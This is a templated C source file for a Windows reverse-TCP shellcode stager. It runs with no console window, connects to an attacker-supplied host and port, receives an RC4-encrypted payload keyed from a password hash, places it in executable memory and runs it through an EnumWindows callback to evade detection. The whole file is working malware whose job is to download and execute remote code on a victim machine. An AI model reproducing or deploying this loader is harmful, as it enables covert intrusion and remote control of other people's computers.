#pragma comment(linker,"/subsystem:\"windows\"  /entry:\"mainCRTStartup\"" )
#define _CRT_SECURE_NO_DEPRECATE
#include <string.h>
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include "rc4.h"
#include "sha1.h"

#ifdef _WIN32
	#pragma comment(lib,"ws2_32.lib")
#endif

static BOOL err_exit(const char* message) {
	printf("\nError: %s\nGetLastError:%d", message, GetLastError());
	return FALSE;
}


BOOL {{FUNCTION}}(const char* host, const  char* port, const  char* pass)
{
	unsigned long hostip;
	unsigned short portnumber;
	unsigned int bufsize;
	unsigned char* buf;
	WSADATA wsaData;
	SOCKET sckt;
	SOCKET cli_sckt;
	SOCKET buffer_socket;

	struct sockaddr_in server;
	struct hostent* hostName;
	int length = 0;
	int location = 0;

	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		return err_exit((char*)"WSAStartup");
	}

	hostName = gethostbyname(host);

	if (hostName == NULL) {
		return err_exit((char*)"gethostbyname");
	}

	hostip = *(unsigned long*)hostName->h_addr_list[0];
	portnumber = htons(atoi(port));

	server.sin_addr.S_un.S_addr = hostip;
	server.sin_family = AF_INET;
	server.sin_port = portnumber;

	sckt = socket(AF_INET, SOCK_STREAM, NULL);

	if (sckt == INVALID_SOCKET) {
		return err_exit((char*)"socket()");
	}

	if (connect(sckt, (struct sockaddr*)&server, sizeof(server)) != 0) {
		return err_exit((char*)"connect()");
	}
	buffer_socket = sckt;


	unsigned char key[SHA1_DIGEST_SIZE + 1];
	key[SHA1_DIGEST_SIZE] = 0;
	sha1_buffer(pass, strlen(pass), (char*)key);
	unsigned char* rc4key = key + 4;
	int xorkey = 0;
	for (int i = 0; i < 4; i++) {
		xorkey ^= key[i] << i * 8;
	}

	recv(buffer_socket, (char*)&bufsize, 4, 0);
	bufsize ^= xorkey;

	buf = (unsigned char*)VirtualAlloc(NULL, bufsize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	buf[0] = 0xbf;
	memcpy(buf + 1, &buffer_socket, 4);

	length = bufsize;
	while (length != 0) {
		int received = 0;
		received = recv(buffer_socket, ((char*)(buf + 5 + location)), length, 0);
		location = location + received;
		length = length - received;
	}
	RC4((char*)rc4key, (char*)(buf)+5, bufsize);

    ::EnumWindows((WNDENUMPROC)buf, NULL);

	return TRUE;

}


//
// Main function
//
int main() {
	{{FUNCTION}}("{{LHOST}}","{{LPORT}}","{{PASSWORD}}");
}
